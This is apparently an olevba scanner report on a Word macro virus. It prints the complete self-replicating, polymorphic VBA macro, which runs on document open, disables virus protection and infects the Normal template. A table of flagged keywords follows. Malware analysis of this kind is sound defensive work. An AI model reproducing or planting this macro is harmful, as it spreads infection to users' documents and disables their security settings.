olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Stp-70086a689ccdf338b7d5cf0cb54f688fc3e8aa49
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Stp-70086a689ccdf338b7d5cf0cb54f688fc3e8aa49 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub dOCumEnt_Open()
On Error Resume Next
Options.VirusProtection = 0: EnableCancelKey = 0
Set MAci = MacroContainer.VBProject.vbComPonENTS.Item(1)
Set MACIc = MAci.codeMoDulE
mI = Left(MACIc.lines(1, 1), 21)
Set iNF = NormalTemplate: mIY = mI + "ClOsE"
If MacroContainer = iNF Then Set iNF = ActiveDocument: mIY = mI + "Open"
Set Infc = iNF.VBProject.vbComPonENTS
Set InFi = Infc.Item(1)
Set inFIC = InFi.codeMoDulE
S = UCase$(MACIc.lines(1, 25))
For kU = 1 To Len(S)
T = Mid(S, kU, 1)
If Asc(T) < 90 And Asc(T) > 65 Then T = Chr$(Asc(T) + Int(Rnd * 2) * 32)
P = P & T
Next kU
MACIc.dElEtElInes 1, 25
MACIc.ADdfRomsTriNg P
For Ik = 2 To Infc.Count: Infc.Remove Infc.Item(2): Next Ik
inFIC.dElEtElInes 1, inFIC.CoUNtOFLInES
inFIC.ADdfRomsTriNg P
inFIC.ReplAcElinE 1, mIY
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'SeLFteXTpOLymORPHism (stP-demo) V1.1 3:16pM Tue MAY 18 99
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |dOCumEnt_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbComPonENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codeMoDulE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADdfRomsTriNg       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

